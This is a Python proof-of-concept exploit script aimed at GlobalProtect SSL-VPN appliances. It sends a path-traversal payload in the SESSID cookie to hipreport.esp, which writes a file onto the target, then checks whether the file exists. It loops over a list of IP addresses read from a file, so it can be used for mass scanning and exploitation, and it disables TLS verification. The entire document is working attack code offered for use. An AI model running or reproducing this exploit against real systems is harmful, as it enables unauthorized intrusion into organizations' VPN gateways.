import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Suppress SSL certificate verification warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# It automatically attempts to hit https
# Modify to your liking
def get_request(ip):
    # First request gets sent to create a new file
    first_request_url = f"https://{ip}/ssl-vpn/hipreport.esp"
    first_response = requests.post(first_request_url, headers={"Cookie": "SESSID=/../../../var/appweb/sslvpndocs/global-protect/portal/images/poc.txt;", "Connection": "close", "Content-Type": "application/x-www-form-urlencoded", "Content-Length": "0"}, verify=False)

    # Second request gets sent to check if the file has been uplaoded
    second_request_url = f"https://{ip}/global-protect/portal/images/poc.txt"
    second_response = requests.get(second_request_url, verify=False)

    # Print status codes
    print("First request status code:", first_response.status_code)
    print("Second request status code:", second_response.status_code)

    # Check if second request is successful
    if second_response.status_code == 404:
        print("Second request failed")
    elif second_response.status_code == 403:
        # If 403 status code is detected, then there is no permission to see the file; hence the file is uploaded
        print("Second request successful")
    else:
        print("Unexpected status code for second request:", second_response.status_code)

# You can feed it a list of IP addresses
def main(input_file):
    with open(input_file, 'r') as f:
        for line in f:
            ip = line.strip()
            get_request(ip)

if __name__ == "__main__":
    input_file = input("Enter the file path containing IP addresses: ")
    main(input_file)
